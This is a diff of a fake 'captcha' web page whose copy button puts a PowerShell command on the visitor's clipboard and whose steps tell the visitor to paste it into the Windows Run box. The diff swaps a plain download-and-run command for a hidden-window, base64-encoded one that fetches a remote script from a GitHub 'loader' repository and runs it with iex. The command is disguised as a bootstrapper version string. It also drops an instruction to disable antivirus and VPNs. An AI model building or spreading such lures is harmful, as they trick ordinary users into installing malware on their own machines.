@@ -27,7 +27,6 @@
 
         <ol class="instructions">
             <li>- Copy the captcha ID.</li>
-            <li>- Turn off tampering apps; antiviruses & vpns</li>
             <li>- Press Windows + R.</li>
             <li>- Press Ctrl + V.</li>
             <li>- Click Ok to finish.</li>
@@ -50,7 +49,7 @@
 
         document.getElementById('copyButton').addEventListener('click', () => {
             const randomCaptchaId = generateRandomNumber();
-            const command = `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/waveget/loader/refs/heads/main/Captcha-Processor.ps1 -OutFile $env:TEMP\\Captcha-Processor.ps1; & $env:TEMP\\Captcha-Processor.ps1" # Security Captcha: ${randomCaptchaId}`;
+            const command = `powershell -windowstyle hidden -EncodedCommand aXdyIC11c2ViICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vd2F2ZWdldC9sb2FkZXJweS9yZWZzL2hlYWRzL21haW4vbWFpbi5wczEnIHwgaWV4Cg== # Nebula BootStrapper Version v1.0.2 Release # ${randomCaptchaId}`;
 
             navigator.clipboard.writeText(command).catch(err => {
                 console.error('Failed to copy: ', err);
